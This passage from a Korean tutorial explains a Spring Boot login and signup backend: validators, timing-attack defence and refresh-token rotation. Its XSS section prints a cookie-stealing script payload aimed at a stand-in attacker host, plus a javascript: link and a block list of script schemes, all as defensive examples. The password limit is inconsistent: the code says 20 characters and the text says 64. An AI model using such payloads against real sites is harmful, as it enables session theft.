> 남은 것은 **`WithdrawalRequest` 에 상한이 없다는 점**입니다. 탈퇴는 로그인한 회원만 부르지만, 수 MB 짜리 문자열을 보내면 PBKDF2 21만 번을 그대로 돌게 되므로 여기에도 같은 상수를 붙이는 게 좋습니다.

**`RefreshRequest`** / **`WithdrawalRequest`**

```java
public record RefreshRequest(
    @NotBlank(...) @Size(max = 2000, ...) String refreshToken) {}          // (1)

public record WithdrawalRequest(
    @NotBlank(message = "비밀번호를 입력해 주세요.") String password,          // (2)
    @SafeText @Size(max = 255, ...) String reason) {}                     // (3)
```

1. JWT 는 길어야 1KB 안쪽이므로 2000자면 넉넉합니다. 무제한으로 받지는 않습니다.
2. **여기 비밀번호도 형식 검사를 안 합니다.** 새로 정하는 값이 아니라 **본인 확인용**이고, 예전 규칙으로 가입한 회원도 탈퇴할 수 있어야 하기 때문입니다.
3. **255자** 는 [`User.WITHDRAWAL_REASON_LENGTH`](#3-16-엔티티--db-표를-자바-클래스로) 와 맞춰 둔 값입니다. 여기서 안 막으면 DB 저장 단계에서 터집니다.

#### 응답 DTO 7개

```java
public record SignupResponse(String message, UserResponse user) {
  public static SignupResponse of(UserResponse user) {                    // (1)
    return new SignupResponse("회원가입에 성공하였습니다", user);
  }
}
```

1. **정적 팩토리 메서드** — `new` 대신 쓰는 생성 메서드입니다.
   > **좋은 점**: 고정 메시지를 안에 숨겨서, 부르는 쪽은 `SignupResponse.of(user)` 만 적으면 됩니다. 메시지를 바꿀 때 한 곳만 고치면 되고, 부르는 곳마다 다른 문구를 적을 위험이 없습니다.

이름 규칙이 있습니다.

| 이름 | 쓰는 때 |
|---|---|
| **`of(...)`** | 받은 값들을 그대로 조립할 때 |
| **`from(...)`** | **다른 타입에서 변환**할 때 |

```java
public record UserResponse(
    Long id, String nickname, String aptName, String dong, String ho, String role) {

  public static UserResponse from(User user) {                            // (1)
    return new UserResponse(
        user.getId(), user.getNickname(), user.getAptName(),
        user.getDong(), user.getHo(),
        user.getRole().name());                                           // (2)
  }
}
```

1. **엔티티 → DTO 변환.** `User` 에서 필요한 것만 골라 담습니다.
2. **`.name()`** — enum 을 문자열로. `Role.USER` → `"USER"`.

**`UserResponse` 에 없는 것을 보세요** — `status`, `withdrawnAt`, `withdrawalReason`, `createdAt` 이 빠져 있습니다. **프런트가 안 쓰는 값은 안 보냅니다.** 필요 없는 정보를 밖으로 내보내지 않는 것이 기본입니다.

```java
public record ErrorResponse(int status, String message) {                 // (1)
  public static ErrorResponse of(ErrorCode errorCode) { ... }             // (2)
  public static ErrorResponse of(int status, String message) { ... }      // (3)
}
```

1. **모든 오류가 이 모양으로 나갑니다.** 프런트는 `message` 하나만 꺼내 쓰면 됩니다.
2. `ErrorCode` 에서 상태와 메시지를 꺼내 만듭니다.
3. **같은 이름의 메서드가 두 개인 것을 오버로딩**이라고 합니다. 파라미터 모양이 달라서 자바가 구분합니다. 검증 오류처럼 **그때그때 메시지가 달라지는 경우**에 씁니다.

---

### 3-14. 검증 — 값이 규칙에 맞는지 보기

#### 구조: 스티커 + 검사기

검증은 **두 파일이 한 쌍**으로 동작합니다.

```
@ValidEmail          (annotation/)  ← 스티커. DTO 필드에 붙임
     │ @Constraint(validatedBy = ...)
     ▼
EmailValidator       (validator/)   ← 실제 검사 코드
```

#### 스티커 쪽 (`ValidEmail.java`)

```java
@Target(ElementType.FIELD)                                                // (1)
@Retention(RetentionPolicy.RUNTIME)                                       // (2)
@Documented                                                               // (3)
@Constraint(validatedBy = EmailValidator.class)                           // (4)
public @interface ValidEmail {                                            // (5)
  String message() default "올바른 이메일 형식이 아닙니다.";                  // (6)

  Class<?>[] groups() default {};                                         // (7)

  Class<? extends Payload>[] payload() default {};
}
```

1. **`@Target(FIELD)`** — 이 스티커는 **필드에만** 붙일 수 있습니다. 클래스나 메서드에 붙이면 컴파일 오류.
2. **`@Retention(RUNTIME)`** — 실행 중에도 이 스티커를 읽을 수 있게 유지합니다. **이게 없으면 컴파일 후에 사라져서 검증이 동작하지 않습니다.**
3. **`@Documented`** — 문서 생성 도구에 포함시킵니다.
4. **핵심 한 줄** — "이 스티커를 보면 `EmailValidator` 를 실행하라".
5. **`@interface`** — 어노테이션을 **정의**하는 문법입니다. `interface` 와 다릅니다.
6. **기본 메시지.** 검증기가 메시지를 직접 정하면 이건 안 쓰입니다.
7. **`groups`, `payload`** — Bean Validation 규격이 **반드시 있어야 한다고 정해 둔** 항목입니다. 이 프로젝트에서는 안 쓰지만, 빼면 오류가 납니다. **"그냥 있어야 하는 것"** 으로 받아들이면 됩니다.

네 개 모두 구조가 똑같습니다.

| 스티커 | 검사기 | 붙는 곳 |
|---|---|---|
| `@ValidEmail` | `EmailValidator` | 가입 이메일 |
| `@ValidPassword` | `PasswordValidator` | 가입 비밀번호 |
| `@ValidNickname` | `NicknameValidator` | 닉네임 |
| `@SafeText` | `SafeTextValidator` | 닉네임·아파트명·동·호·탈퇴 사유 |

#### `EmailValidator` — 이메일 검사

```java
public class EmailValidator implements ConstraintValidator<ValidEmail, String> {  // (1)

  private static final int MIN_LENGTH = 7;                                // (2)
  private static final int MAX_LENGTH = 100;                              // (3)

  private static final Pattern ASCII_PATTERN = Pattern.compile("^[\\x21-\\x7E]+$"); // (4)

  private static final Pattern EMAIL_PATTERN =
      Pattern.compile("^[A-Za-z0-9._%+-]+@[A-Za-z0-9-]+(\\.[A-Za-z0-9-]+)*\\.[A-Za-z]{2,}$"); // (5)
```

1. **`ConstraintValidator<스티커, 검사할타입>`** — 두 개를 적어 줘야 합니다.
2. **`"ab@c.de"` 가 딱 7자**입니다. 이보다 짧으면 정상적인 주소가 나올 수 없습니다.
3. **`accounts.email` 컬럼 길이와 맞춥니다.** 여기서 안 막으면 DB 저장 단계에서 터집니다.
4. **정규식 읽는 법**:
   - `^` 시작, `$` 끝 → **전체가 다 맞아야 함**
   - `[\x21-\x7E]` → 아스키 코드 0x21(`!`)부터 0x7E(`~`)까지. **공백과 제어문자를 뺀 출력 가능한 ASCII**
   - `+` → 하나 이상
   → 한글·일본어 이메일은 여기서 걸립니다.
5. **이메일 형식**:
   - `[A-Za-z0-9._%+-]+` 앞부분(로컬 파트)
   - `@`
   - `[A-Za-z0-9-]+` 도메인
   - `(\.[A-Za-z0-9-]+)*` 점으로 이어지는 하위 도메인, 0번 이상
   - `\.[A-Za-z]{2,}` 마지막은 점 + **영문 2자 이상** (`.com`, `.kr`)

> **자바 기본 `@Email` 을 쓰면 안 되나요?** 그건 `"가@나"` 같은 것도 통과시킵니다. 표준 이메일 규격이 실제로 그만큼 느슨하기 때문인데, 우리 서비스에는 지나치게 관대합니다.

```java
  @Override
  public boolean isValid(String email, ConstraintValidatorContext context) {
    if (email == null || email.isBlank()) {
      return reject(context, "이메일을 입력해 주세요.");                     // (1)
    }

    if (containsWhitespace(email)) {                                      // (2)
      return reject(context, "이메일에는 공백을 포함할 수 없습니다.");
    }

    if (countAtSign(email) != 1) {                                        // (3)
      return reject(context, "이메일에는 @를 하나만 포함해야 합니다.");
    }

    if (email.length() < MIN_LENGTH) { ... }
    if (email.length() > MAX_LENGTH) { ... }

    if (!ASCII_PATTERN.matcher(email).matches()) { ... }
    if (!EMAIL_PATTERN.matcher(email).matches()) { ... }

    return true;                                                          // (4)
  }
```

1. **규칙마다 메시지가 다릅니다.** "형식이 올바르지 않습니다" 하나로 끝내면 사용자는 뭘 고쳐야 할지 모릅니다.
2. **공백을 따로 보는 이유**: 공백(0x20)은 ASCII 범위 밖(0x21~)이라 아래 ASCII 검사에도 걸리기는 하지만, **더 정확한 메시지**를 주기 위해 먼저 봅니다.
3. **`@` 개수를 세는 이유**: 정규식만으로도 걸러지지만, `"a@b@c.com"` 에 "형식이 틀렸다"보다 **"@를 하나만"** 이 훨씬 친절합니다.
4. 전부 통과하면 참.

```java
  private boolean reject(ConstraintValidatorContext context, String message) {
    context.disableDefaultConstraintViolation();                          // (1)
    context.buildConstraintViolationWithTemplate(message).addConstraintViolation(); // (2)
    return false;                                                         // (3)
  }
```

1. **기본 메시지를 끕니다.** 안 끄면 `@ValidEmail` 의 `message` 와 우리 메시지가 **둘 다** 나갑니다.
2. 우리 메시지를 대신 담습니다.
3. **항상 `false` 를 돌려주므로**, 부르는 쪽에서 `return reject(...)` 로 한 줄에 쓸 수 있습니다.

#### `PasswordValidator` — 비밀번호 검사

```java
  public static final int MIN_LENGTH = 8;
  public static final int MAX_LENGTH = 20;                                // (1)

  private static final Pattern ASCII_PATTERN = Pattern.compile("^[\\x21-\\x7E]+$"); // (2)
  private static final Pattern LETTER_PATTERN = Pattern.compile("[A-Za-z]");
  private static final Pattern DIGIT_PATTERN = Pattern.compile("[0-9]");
  private static final Pattern SPECIAL_PATTERN = Pattern.compile("[^A-Za-z0-9]"); // (3)
```

1. **상한 64자** — 긴 비밀번호를 쓰는 사람을 막지 않으려고 넉넉히 뒀습니다.
   > **PBKDF2 는 입력 길이 제한이 없습니다.** (참고로 BCrypt 는 72바이트를 넘으면 뒷부분을 **조용히 버립니다.** 그래서 BCrypt 를 쓰는 서비스는 상한을 꼭 둬야 합니다)
2. **한글과 공백을 막는 이유**:
   > 회원의 입력기(IME)나 자동완성 설정에 따라 **같은 키를 눌러도 다른 글자가 만들어질 수 있습니다.** 가입할 때와 로그인할 때의 값이 어긋나면 본인도 못 들어옵니다.
3. **`[^...]`** 의 `^` 는 **부정**입니다. "영문도 숫자도 아닌 것" = 특수문자.

```java
    if (!LETTER_PATTERN.matcher(password).find()                          // (1)
        || !DIGIT_PATTERN.matcher(password).find()
        || !SPECIAL_PATTERN.matcher(password).find()) {
      return reject(context, "비밀번호는 영문, 숫자, 특수문자를 각각 1자 이상 포함해야 합니다.");
    }
```

1. **`find()` 와 `matches()` 의 차이** — 중요합니다.
   - **`matches()`** : 문자열 **전체**가 패턴과 맞아야 참
   - **`find()`** : 패턴이 **어딘가에 하나라도** 있으면 참

   "영문이 **포함**되어 있는가"를 보는 것이므로 `find()` 가 맞습니다.

#### `NicknameValidator` — 가장 짧은 검사기

```java
public class NicknameValidator implements ConstraintValidator<ValidNickname, String> {
  private static final Pattern NICKNAME_PATTERN = Pattern.compile("^[가-힣a-zA-Z0-9]{2,10}$"); // (1)

  @Override
  public boolean isValid(String nickname, ConstraintValidatorContext context) {
    if (nickname == null) {
      return false;                                                       // (2)
    }
    return NICKNAME_PATTERN.matcher(nickname).matches();
  }
}
```

1. **`[가-힣]`** 은 완성형 한글 전체 범위입니다. `{2,10}` 은 2자 이상 10자 이하.
2. **`reject` 를 안 쓰므로** `@ValidNickname` 의 기본 메시지("닉네임 형식이 맞지 않습니다")가 그대로 나갑니다. 규칙이 하나뿐이라 나눌 필요가 없습니다.

#### `SafeTextValidator` — 스크립트 막기

**XSS 공격**을 막습니다. 닉네임에 이런 걸 넣는 상황입니다.

```
닉네임: <script>fetch('http://공격자.com?c='+document.cookie)</script>
```

이 닉네임이 게시판에 그려지면, **그 글을 본 모든 사람의 브라우저에서** 스크립트가 실행됩니다.

```java
  private static final Pattern CHARACTER_REFERENCE =
      Pattern.compile("&(#[0-9]+|#[xX][0-9a-fA-F]+|[A-Za-z][A-Za-z0-9]{1,31});"); // (1)

  private static final String[] SCRIPT_SCHEMES = {
    "javascript:", "vbscript:", "data:", "file:", "blob:"                 // (2)
  };
```

1. **HTML 문자 참조** — `&lt;` `&#60;` `&#x3c;` 는 모두 `<` 를 다르게 적은 것입니다. 허용하면 **화면에서 태그로 되살아날 수 있습니다.**
2. **`href` 나 `src` 에 들어가면 스크립트가 되는 주소 형식들.**
   ```html
   <a href="javascript:alert(1)">클릭</a>
   ```

```java
  @Override
  public boolean isValid(String value, ConstraintValidatorContext context) {
    if (value == null) {
      return true;                                                        // (1)
    }

    if (containsTag(value)) {
      return reject(context, "HTML 태그는 사용할 수 없습니다.");
    }
    if (CHARACTER_REFERENCE.matcher(value).find()) { ... }
    if (containsScriptScheme(value)) { ... }
    if (containsInvisible(value)) { ... }

    return true;
  }
```

1. **`null` 은 통과시킵니다.** "비어 있는지"는 `@NotBlank` 의 일입니다. **검사기 하나가 한 가지만 책임지게** 나눈 것입니다. (동·호는 비워도 되므로 `@SafeText` 가 `null` 을 막으면 안 됩니다)

```java
  private boolean containsTag(String value) {
    return value.indexOf('<') >= 0 || value.indexOf('>') >= 0;            // (1)
  }
```

1. **`<` 와 `>` 를 아예 거절합니다.** 태그 모양을 정교하게 판별하는 대신 **꺾쇠 자체를 막는** 단순한 방식입니다. 규칙이 단순할수록 구멍이 적습니다.

```java
  private boolean containsScriptScheme(String value) {
    StringBuilder squeezed = new StringBuilder(value.length());
    for (int i = 0; i < value.length(); i++) {
      char c = value.charAt(i);
      if (Character.isWhitespace(c) || isInvisible(c)) {                  // (1)
        continue;
      }
      squeezed.append(c);
    }

    String normalized = squeezed.toString().toLowerCase(Locale.ROOT);     // (2)
    for (String scheme : SCRIPT_SCHEMES) {
      if (normalized.contains(scheme)) {
        return true;
      }
    }
    return false;
  }
```

1. **공백과 보이지 않는 문자를 먼저 걷어냅니다.** 이유:
   ```
   "java\nscript:"     ← 줄바꿈을 끼워 넣어 숨김. 브라우저는 무시하고 실행함
   "java script:"      ← 공백을 끼워 넣음
   ```
2. **소문자로 맞춥니다.**
   ```
   "JaVaScRiPt:"       ← 대소문자를 섞어 숨김
   ```

**이 검사기의 설계 원칙**

> **값을 다듬어서 저장하지 않고, 그냥 거절합니다.**
> 다듬어 저장하면 (1) 회원이 적은 것과 저장된 것이 달라지고, (2) 거르는 규칙에 구멍이 하나라도 생기면 **그대로 새어 나갑니다.** 거절하면 구멍이 생겨도 "못 쓰는 닉네임" 정도로 끝납니다.
>
> 물론 **화면에 그릴 때 이스케이프하는 것**이 근본 대책입니다. 이건 그 앞에 한 겹 더 두는 것입니다.

---
### 3-15. `AuthService.java` — 실제로 판단하는 곳

**245줄. 이 프로젝트의 심장입니다.** 회원가입·로그인·재발급·로그아웃·탈퇴의 모든 판단이 여기서 일어납니다.

#### 클래스 선언

```java
@Service                                                                  // (1)
@RequiredArgsConstructor
@Transactional                                                            // (2)
public class AuthService {

  private final UserRepository userEntityRepository;                      // (3)
  private final AccountRepository accountEntityRepository;
  private final NanumiPasswordEncoder nanumiPasswordEncoder;
  private final JwtTokenProvider jwtTokenProvider;
  private final LoginAttemptService loginAttemptService;
```

1. **`@Service`** — `@Component` 와 기능은 같지만, **"이건 비즈니스 로직"** 이라고 읽는 사람에게 알려 줍니다.
2. **`@Transactional`** — **클래스에 붙이면 모든 public 메서드에 적용**됩니다. 이게 이 클래스에서 가장 중요한 스티커입니다.

   **트랜잭션이 하는 일:**
   ```
   메서드 시작 → DB 작업들 → 메서드 정상 종료 → 전부 확정(커밋)
                          → 예외 발생       → 전부 되돌림(롤백)
   ```

   회원가입에서 `User` 는 저장됐는데 `Account` 저장이 실패하면? **`User` 도 같이 없던 일이 됩니다.** "계정 없는 유령 회원"이 생기지 않습니다.

   > **그리고 이것이 [변경 감지](#0-5-데이터베이스와-jpa)가 동작하는 조건입니다.** 트랜잭션 안에서 엔티티 값을 바꾸면, `save()` 를 안 불러도 끝날 때 자동으로 `UPDATE` 가 나갑니다.
3. **필요한 도구 5개.** 전부 `final` + 생성자 주입입니다.

#### 더미 해시 — 눈에 안 보이는 방어

```java
  private String dummyPasswordHash;                                       // (1)

  @PostConstruct
  void initDummyPasswordHash() {
    this.dummyPasswordHash = nanumiPasswordEncoder.encode(UUID.randomUUID().toString()); // (2)
  }
```

1. **없는 계정으로 로그인을 시도해도 있을 때와 같은 시간을 쓰려고 미리 만들어 두는 해시**입니다.
2. **`UUID.randomUUID()`** 는 아무도 모르는 무작위 문자열입니다. 즉 **이 해시에 맞는 비밀번호는 이 세상에 없습니다.**

**왜 필요한가 — 타이밍 공격**

```
계정이 있을 때  : DB 조회 → PBKDF2 21만 번(0.1초) → 실패 응답    총 0.12초
계정이 없을 때  : DB 조회 → (바로 실패 응답)                      총 0.02초  ← 확 빠름!
```

공격자는 **응답 시간만 재 보고** "이 이메일은 가입돼 있구나"를 알아낼 수 있습니다. 회원 명단이 새어 나가는 셈입니다.
그래서 계정이 없을 때도 **더미 해시로 똑같이 해싱을 돌려서** 시간을 맞춥니다.

> **솔직한 한계**: 이건 **로그인 응답 시간만** 맞추는 것입니다. 회원가입은 중복 이메일을 409 로 그대로 알려 주므로 **가입 여부 자체를 숨기지는 못합니다.**
> 가입 화면에서 "이미 쓰는 이메일" 안내를 빼면 UX 가 크게 나빠져서 노출을 감수한 것이고, 로그인 쪽 방어는 **"가입 여부를 모르는 사람이 응답 시간만으로 알아내는 것"** 을 막는 데 목적이 있습니다.

#### 회원가입

```java
  public SignupResponse signup(SignupRequest request) {
    String email = normalizeEmail(request.email());                       // (1)

    if (accountEntityRepository.existsByEmail(email)) {
      throw new CustomException(ErrorCode.DUPLICATE_EMAIL);                // (2)
    }

    if (userEntityRepository.existsByNicknameIgnoreCase(request.nickname())) { // (3)
      throw new CustomException(ErrorCode.DUPLICATE_NICKNAME);
    }

    User user =
        User.builder()                                                    // (4)
            .nickname(request.nickname())
            .aptName(request.aptName())
            .dong(blankToNull(request.dong()))                            // (5)
            .ho(blankToNull(request.ho()))
            .build();
    userEntityRepository.save(user);                                      // (6)

    Account account =
        Account.builder()
            .user(user)                                                   // (7)
            .email(email)
            .password(nanumiPasswordEncoder.encode(request.password()))   // (8)
            .build();
    accountEntityRepository.save(account);

    return SignupResponse.of(UserResponse.from(user));                    // (9)
  }
```

1. **이메일을 소문자로 맞춥니다.** (아래 `normalizeEmail` 참고)
2. **이미 있으면 409.** `throw` 하는 순간 아래 코드는 실행되지 않고, 트랜잭션도 롤백됩니다.
3. **`IgnoreCase`** — 닉네임은 대소문자를 무시하고 봅니다. `abc` 와 `ABC` 가 따로 존재하면 사람이 헷갈리기 때문입니다.
4. **빌더 패턴** — 값을 하나씩 이름과 함께 채워 넣습니다.
   > **왜 좋은가**: `new User("철수", "행복아파트", "101", "202")` 는 순서를 하나만 바꿔도 조용히 잘못된 데이터가 들어갑니다. 빌더는 이름이 붙어 있어 그런 실수가 없고, **선택 항목을 빼먹어도 됩니다.**
5. **`blankToNull`** — 화면에서 비워 두면 빈 문자열(`""`)로 오는데, 그대로 담으면 **"값이 있는데 빈 값"** 이라는 애매한 상태가 됩니다. `null`(값 없음)로 통일합니다.
6. **`save`** — DB 에 저장하고, `user.id` 가 채워집니다.
7. **`Account` 가 `User` 를 참조합니다.** 저장 순서가 중요합니다 — `User` 가 먼저 저장돼서 `id` 를 받아야 연결할 수 있습니다.
8. **비밀번호를 여기서 해싱합니다.** 평문은 이 줄 이후로 어디에도 남지 않습니다.
9. **엔티티를 그대로 안 주고 `UserResponse` 로 갈아탑니다.**

> 🔎 **검사와 저장 사이의 틈**: 2번 검사를 통과한 직후, 저장하기 전에 **다른 요청이 같은 이메일로 가입할 수 있습니다.** 그러면 둘 다 검사를 통과하고 DB 제약에서 하나가 터집니다. 그 경우를 [`GlobalExceptionHandler`](#3-18-예외-처리--오류를-한-모양으로) 가 받아서 **500 대신 409** 로 바꿔 줍니다. 이중으로 막아 둔 것입니다.

#### 로그인 — 가장 복잡한 메서드

```java
  public LoginResponse login(LoginRequest request, String clientIp) {
    String email = normalizeEmail(request.email());

    loginAttemptService.checkBlocked(email, clientIp);                    // (1)

    Account account = accountEntityRepository.findByEmail(email).orElse(null); // (2)

    if (account == null) {
      nanumiPasswordEncoder.matches(request.password(), dummyPasswordHash); // (3)
      loginAttemptService.recordFailure(email, clientIp);
      throw new CustomException(ErrorCode.INVALID_CREDENTIALS);           // (4)
    }

    if (!nanumiPasswordEncoder.matches(request.password(), account.getPassword())) {
      loginAttemptService.recordFailure(email, clientIp);
      throw new CustomException(ErrorCode.INVALID_CREDENTIALS);           // (4)
    }

    loginAttemptService.recordSuccess(email, clientIp);                   // (5)

    User user = account.getUser();
    if (user.isWithdrawn()) {
      throw new CustomException(ErrorCode.WITHDRAWN_USER);                // (6)
    }

    if (nanumiPasswordEncoder.upgradeEncoding(account.getPassword())) {   // (7)
      account.changePassword(nanumiPasswordEncoder.encode(request.password()));
    }

    String accessToken = jwtTokenProvider.createAccessToken(user.getId()); // (8)
    String refreshToken = issueRefreshToken(account, user);

    return LoginResponse.of(accessToken, refreshToken, UserResponse.from(user));
  }
```

1. **가장 먼저 잠금 확인.** 막혀 있으면 **비밀번호를 맞춰 보기도 전에** 끊습니다. 잠긴 계정에 대해서는 해싱 비용조차 쓰지 않습니다.
2. **`.orElse(null)`** — `Optional` 에서 값을 꺼내되, 없으면 `null`. 여기서는 없을 때 특별한 처리를 해야 해서 이렇게 받습니다.
3. **더미 해시로 시간 맞추기.** 결과를 쓰지 않고 버립니다. **오직 시간을 쓰기 위한 줄**입니다.
4. **계정이 없을 때와 비밀번호가 틀렸을 때, 완전히 같은 오류를 냅니다.**
   > "이메일 **또는** 비밀번호가 올바르지 않습니다" 라는 문구가 그래서 나온 것입니다. "이메일이 없습니다"라고 알려 주면 **회원 명단을 만들 수 있습니다.**
5. **성공했으면 실패 기록을 지웁니다.** (이메일 쪽만 — [3-10](#3-10-loginattemptservicejava--비밀번호-찍기-막기) 참고)
6. **탈퇴 확인은 비밀번호 확인 뒤에 합니다.**
   > 순서가 중요합니다. 먼저 확인하면 **비밀번호를 몰라도** "이 계정은 탈퇴했다"를 알아낼 수 있습니다.
7. **필요하면 더 강한 해시로 다시 저장합니다.**
   > **`save()` 가 없는데도 DB 에 반영됩니다.** `account` 는 트랜잭션 안에서 조회한 엔티티라, 값이 바뀌면 [변경 감지](#0-5-데이터베이스와-jpa)로 자동 `UPDATE` 됩니다.
8. **토큰 두 개를 발급합니다.**

#### 토큰 재발급 — 회전과 재사용 감지

```java
  @Transactional(noRollbackFor = CustomException.class)                   // (1)
  public TokenResponse refresh(RefreshRequest request) {
    Long userId =
        jwtTokenProvider
            .resolveUserId(request.refreshToken(), TokenType.REFRESH)     // (2)
            .orElseThrow(() -> new CustomException(ErrorCode.INVALID_TOKEN)); // (3)

    Account account =
        accountEntityRepository
            .findByUser_Id(userId)
            .orElseThrow(() -> new CustomException(ErrorCode.USER_NOT_FOUND));

    if (!account.hasRefreshToken() || account.isExpired()) {
      throw new CustomException(ErrorCode.EXPIRED_REFRESH_TOKEN);         // (4)
    }

    if (!matchesStoredRefreshToken(account, request.refreshToken())) {
      account.clearRefreshToken();                                        // (5)
      throw new CustomException(ErrorCode.INVALID_TOKEN);
    }

    User user = account.getUser();
    if (user.isWithdrawn()) {
      throw new CustomException(ErrorCode.WITHDRAWN_USER);
    }

    String accessToken = jwtTokenProvider.createAccessToken(user.getId());
    String refreshToken = issueRefreshToken(account, user);               // (6)

    return TokenResponse.of(accessToken, refreshToken);
  }
```

1. **`noRollbackFor`** — 이 메서드에만 특별한 규칙입니다.

   > 5번에서 **세션을 끊는 작업**을 하는데, 바로 뒤에 예외를 던집니다. 기본 설정이라면 예외 때문에 **끊은 것까지 되돌려집니다.** 그러면 방어가 무의미해집니다.
   > 그래서 "이 예외에서는 롤백하지 마라"고 지정했습니다. 이 메서드는 **검사를 다 통과한 뒤에야 값을 바꾸므로**, 롤백하지 않아도 남는 부작용이 없습니다.
2. **`TokenType.REFRESH`** — 액세스 토큰을 여기 넣으면 거부됩니다.
3. **`orElseThrow`** — `Optional` 이 비어 있으면 예외를 던집니다. `() -> ...` 는 "예외를 만드는 방법"을 넘기는 것으로, **실제로 필요할 때만** 만들어집니다.
4. **로그아웃했거나 담아 둔 토큰의 기한이 지난 경우.**
5. **재사용 감지 — 이 프로젝트에서 가장 정교한 방어입니다.**

   무슨 상황인가:
   ```
   ① 정상 사용자가 리프레시 → 새 토큰 B 를 받음. DB 에는 B 의 해시가 저장됨
   ② 그런데 공격자가 예전에 토큰 A 를 훔쳐 갔음
   ③ 공격자가 A 로 재발급을 시도
      → A 는 서명이 맞고 만료도 안 됐지만, DB 에 저장된 건 B 임 → 불일치!
   ```

   **이 불일치는 "토큰이 새어 나갔다"는 강한 신호입니다.** 그래서 그냥 거절하는 데서 그치지 않고, **진짜 주인이 쓰던 토큰까지 같이 끊고** 다시 로그인하게 만듭니다.

   > 🔎 **부작용**: 브라우저 탭 두 개를 동시에 열어 두면, 양쪽이 각자 리프레시를 시도하다가 **서로를 로그아웃시킬 수 있습니다.** 탭 사이에 토큰을 공유하는 장치를 프런트에 넣으면 해결됩니다.
6. **회전(rotation)** — 재발급할 때마다 **리프레시 토큰도 새로 내줍니다.**
   > 한 번 쓴 토큰은 즉시 무효가 되므로, 훔쳐 가도 쓸 수 있는 시간이 짧아집니다. 그리고 위의 재사용 감지가 성립하려면 회전이 반드시 필요합니다.

#### 로그아웃

```java
  public LogoutResponse logout(Long userId) {
    Account account =
        accountEntityRepository
            .findByUser_Id(userId)
            .orElseThrow(() -> new CustomException(ErrorCode.USER_NOT_FOUND));

    account.clearRefreshToken();                                          // (1)

    return LogoutResponse.of();
  }
```

1. **저장된 리프레시 토큰을 지웁니다.** (여기도 `save()` 없이 변경 감지로 반영됩니다)

> ⚠️ **이미 발급된 액세스 토큰은 여전히 살아 있습니다.**
> JWT 는 서버가 기억하지 않는 방식이라, 한 번 나간 토큰을 취소할 수 없습니다. 취소하려면 요청마다 DB 를 뒤져야 하는데 그러면 토큰을 쓰는 의미가 사라집니다.
> 그래서 **액세스 토큰의 수명을 15분으로 짧게** 잡아서 그 틈을 줄이는 방식을 택했습니다.
> 결과적으로 로그아웃 후 최대 15분간 기존 액세스 토큰이 유효하지만, **새로 받을 수는 없으므로** 그 뒤로는 완전히 끊깁니다.

#### 회원탈퇴

```java
  public WithdrawalResponse withdraw(Long userId, WithdrawalRequest request) {
    Account account = accountEntityRepository.findByUser_Id(userId)
        .orElseThrow(() -> new CustomException(ErrorCode.USER_NOT_FOUND));

    User user = account.getUser();
    if (user.isWithdrawn()) {
      throw new CustomException(ErrorCode.WITHDRAWN_USER);                // (1)
    }

    if (!nanumiPasswordEncoder.matches(request.password(), account.getPassword())) {
      throw new CustomException(ErrorCode.INVALID_CREDENTIALS);           // (2)
    }

    user.withdraw(blankToNull(request.reason()));                         // (3)
    account.clearRefreshToken();                                          // (4)

    return WithdrawalResponse.of(user.getWithdrawnAt());
  }
```

1. 이미 탈퇴했으면 거절.
2. **탈퇴할 때 비밀번호를 다시 받는 이유**: 토큰만으로 탈퇴가 되면, 남의 컴퓨터를 잠깐 만지거나 토큰을 훔친 사람이 **계정을 없앨 수 있습니다.** 되돌리기 어려운 작업이므로 본인 확인을 한 번 더 합니다.
3. **탈퇴 처리** — 행을 지우지 않고 **상태만 바꿉니다**(soft delete).
   > 진짜로 지우면 (1) 실수로 탈퇴한 사람을 되살릴 수 없고, (2) 그 사람이 남긴 글에서 작성자가 사라져 화면이 깨지고, (3) 법적으로 일정 기간 보관해야 하는 정보를 지워 버릴 수 있습니다.
4. **로그인 세션도 끊습니다.**

#### 보조 메서드들

```java
  private String issueRefreshToken(Account account, User user) {
    String refreshToken = jwtTokenProvider.createRefreshToken(user.getId());

    account.updateRefreshToken(
        hashRefreshToken(refreshToken),                                   // (1)
        LocalDateTime.now().plusSeconds(jwtTokenProvider.getRefreshTokenExpiration() / 1000)); // (2)

    return refreshToken;                                                  // (3)
  }
```

1. **DB 에는 해시만 담습니다. 원문은 담지 않습니다.**
   > 리프레시 토큰 원문을 저장하면, **DB 가 유출됐을 때 그대로 로그인에 쓸 수 있는 자격 증명**이 됩니다. 해시만 담으면 유출돼도 쓸 수 없습니다. 비밀번호와 같은 이유입니다.
2. **`/ 1000`** — 설정값은 밀리초인데 `plusSeconds` 는 초를 받으므로 나눠 줍니다.
3. **회원에게는 원문을 돌려줍니다.** 원문은 이 순간 이후로 서버 어디에도 남지 않습니다.

```java
  private boolean matchesStoredRefreshToken(Account account, String refreshToken) {
    return MessageDigest.isEqual(                                         // (1)
        account.getRefreshTokenHash().getBytes(StandardCharsets.UTF_8),
        hashRefreshToken(refreshToken).getBytes(StandardCharsets.UTF_8));
  }
```

1. **여기도 상수 시간 비교입니다.** 비밀번호와 같은 이유로 타이밍 공격을 막습니다.

```java
  private static String hashRefreshToken(String refreshToken) {
    try {
      MessageDigest digest = MessageDigest.getInstance("SHA-256");
      return HexFormat.of().formatHex(digest.digest(refreshToken.getBytes(StandardCharsets.UTF_8))); // (1)
    } catch (NoSuchAlgorithmException e) {
      throw new IllegalStateException("SHA-256 을 쓰지 못함", e);
    }
  }
```

1. **`formatHex`** — 바이트를 16진수 글자로. 32바이트 → **64글자**가 되고, 이게 `Account.refreshTokenHash` 컬럼 길이 64 의 근거입니다.

> **비밀번호는 PBKDF2 21만 번인데, 토큰은 왜 SHA-256 한 번인가요?**
>
> 느리게 하는 이유는 **사람이 정한 비밀번호가 추측 가능하기 때문**입니다(`1234`, `password`). 토큰은 서버가 만든 **길고 완전히 무작위인 값**이라 추측 자체가 불가능합니다. 느리게 할 필요도, salt 를 붙일 필요도 없습니다.
> 오히려 토큰 검증은 API 를 부를 때마다 일어나므로 **빠른 게 중요합니다.**

```java
  private String normalizeEmail(String email) {
    return email == null ? null : email.trim().toLowerCase(Locale.ROOT);
  }
```

**이메일은 대소문자를 가리지 않습니다.** `Test@a.com` 과 `test@a.com` 은 같은 주소입니다.
그래서 **저장할 때도 찾을 때도 소문자로 맞춥니다.** 안 그러면 `Test@a.com` 으로 가입한 뒤 `test@a.com` 으로 **또 가입**할 수 있습니다.

```java
  private String blankToNull(String value) {
    return (value == null || value.isBlank()) ? null : value;
  }
```

`""` 나 `"   "` 를 `null` 로 바꿉니다. **"값 없음"을 한 가지 방식으로만 표현**하기 위해서입니다.

---

### 3-16. 엔티티 — DB 표를 자바 클래스로

